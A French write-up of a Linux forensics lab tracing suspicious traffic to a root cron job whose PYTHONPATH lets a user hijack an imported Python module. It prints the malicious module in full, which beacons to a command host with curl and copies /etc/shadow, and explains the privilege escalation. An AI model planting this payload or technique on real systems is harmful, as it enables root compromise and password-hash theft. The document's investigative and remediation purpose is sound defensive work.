# Investigating a Rogue Process - Writeup

## Contexte

Skyview Media a détecté du trafic réseau suspect vers l'adresse IP `192.0.2.1` depuis une machine Linux. 
Mission : investiguer et identifier la source du problème.

**Credentials :** `jedha:jedha` (avec privilèges root via sudo)

---

## Étape 1 : Identifier le processus suspect

Utilisation de `ss` pour trouver les connexions vers l'IP suspecte :

```bash
ss -tunap | grep 192.0.2.1
```

**Options :**
- `-t` : connexions TCP
- `-u` : connexions UDP
- `-n` : ne pas résoudre les noms (plus rapide)
- `-a` : tous les sockets
- `-p` : afficher le processus utilisant le socket

**Résultat :**
```
tcp   SYN-SENT 0   1   192.168.128.235:55020   192.0.2.1:80   users:(("curl",pid=18333,fd=5))
```

Le programme **curl** contacte 192.0.2.1 sur le port 80. Le processus disparaît rapidement → signe d'une **tâche planifiée**.

---

## Étape 2 : Trouver la tâche cron

Vérification des crontabs :

```bash
crontab -l -u pete    # no crontab for pete
crontab -l -u root    # no crontab for root
ls -la /etc/cron.d/   # Liste des fichiers cron système
```

Un fichier suspect apparaît : `/etc/cron.d/backup`

```bash
cat /etc/cron.d/backup
```

```
SHELL=/bin/bash
* * * * * root . /etc/cron.env && python3 /usr/local/bin/backup.py
```

Ce cron :
- S'exécute **toutes les minutes** (`* * * * *`)
- Tourne en tant que **root**
- Source `/etc/cron.env` avant d'exécuter le script Python

---

## Étape 3 : Analyser le script de backup

```bash
cat /usr/local/bin/backup.py
```

```python
#!/usr/bin/env python3

import backup_utils

def main():
    src = "/home/user/documents"
    dest = "/var/backups/documents"
    backup_utils.rotate_backups(dest)
    backup_utils.copy_files(src, dest)

if __name__ == "__main__":
    main()
```

Le script importe `backup_utils`. D'où vient ce module ?

---

## Étape 4 : Identifier la vulnérabilité

```bash
cat /etc/cron.env
```

```
export PYTHONPATH=/home/pete/.mybackup
```

Le PYTHONPATH pointe vers un dossier **contrôlé par l'utilisateur pete** !

```bash
ll /home/pete/.mybackup/
```

```
drwxrwxr-x 3 pete pete 4096 May  2  2025 ./
-rw-rw-r-- 1 pete pete  234 May  2  2025 backup_utils.py
-rw-rw-r-- 1 pete pete    0 May  2  2025 __init__.py
drwxr-xr-x 2 root root 4096 May  2  2025 __pycache__/
```

---

## Étape 5 : Analyser le code malveillant

```bash
cat /home/pete/.mybackup/backup_utils.py
```

```python
import os
import time
os.system("curl -s --connect-timeout 45 http://192.0.2.1/ping")
os.system("cat /etc/shadow > /home/pete/.etcshadow")
time.sleep(20)
def copy_files(*args, **kwargs): pass
def rotate_backups(*args, **kwargs): pass
```

**Actions malveillantes :**
1. **Beacon C2** : envoie un ping vers 192.0.2.1 (potentiel serveur de commande et contrôle)
2. **Exfiltration** : copie `/etc/shadow` (hash des mots de passe) vers `/home/pete/.etcshadow`
3. **Fonctions factices** : pour que le script backup.py ne plante pas

---

## Étape 6 : Vérifier l'exfiltration

```bash
ll /home/pete/
```

```
-rw-r--r-- 1 root root 1455 Jan 22 14:53 .etcshadow
```

Le fichier `.etcshadow` appartient à **root** (car le cron s'exécute en root) et contient une copie de `/etc/shadow` avec les hash des mots de passe de tous les utilisateurs.

---

## Chaîne d'attaque complète

```
┌─────────────────────────────────────────────────────────────────────────┐
│  /etc/cron.d/backup (s'exécute toutes les minutes en root)              │
│       │                                                                 │
│       ▼                                                                 │
│  source /etc/cron.env  →  export PYTHONPATH=/home/pete/.mybackup        │
│       │                                                                 │
│       ▼                                                                 │
│  python3 /usr/local/bin/backup.py                                       │
│       │                                                                 │
│       ▼                                                                 │
│  import backup_utils  →  charge /home/pete/.mybackup/backup_utils.py    │
│       │                                                                 │
│       ▼                                                                 │
│  Code malveillant s'exécute avec privilèges ROOT :                      │
│    • curl http://192.0.2.1/ping (beacon C2)                             │
│    • cat /etc/shadow > /home/pete/.etcshadow (exfiltration)             │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## Réponses aux questions

### 1. Is the attack persistent? Why?

**Oui**, l'attaque est persistante car :
- Le cron `/etc/cron.d/backup` s'exécute **toutes les minutes** (`* * * * *`)
- Il survit aux redémarrages de la machine
- Tant que le fichier cron et le module malveillant existent, l'attaque continue

### 2. Did the attack require root privilege?

**Non**, l'attaquant (pete) n'avait pas besoin de privilèges root :
- Pete a simplement créé un fichier `backup_utils.py` dans son propre home (`/home/pete/.mybackup/`)
- C'est le **cron qui s'exécute en root** et charge le module malveillant
- Résultat : **élévation de privilèges** - le code de pete s'exécute avec les droits root

### 3. What was the main issue that made the attack possible?

**Mauvaise configuration du PYTHONPATH** :
- `/etc/cron.env` définit `PYTHONPATH=/home/pete/.mybackup`
- Ce dossier est **contrôlé par un utilisateur non-privilégié** (pete)
- Un script exécuté en **root** charge des modules depuis ce dossier
- → **Python Library Hijacking**

---

## Remédiation

1. **Supprimer le fichier malveillant** :
   ```bash
   rm -rf /home/pete/.mybackup/
   rm /home/pete/.etcshadow
   ```

2. **Corriger la configuration** :
   ```bash
   rm /etc/cron.env
   # Ou modifier pour pointer vers un dossier sécurisé
   ```


---
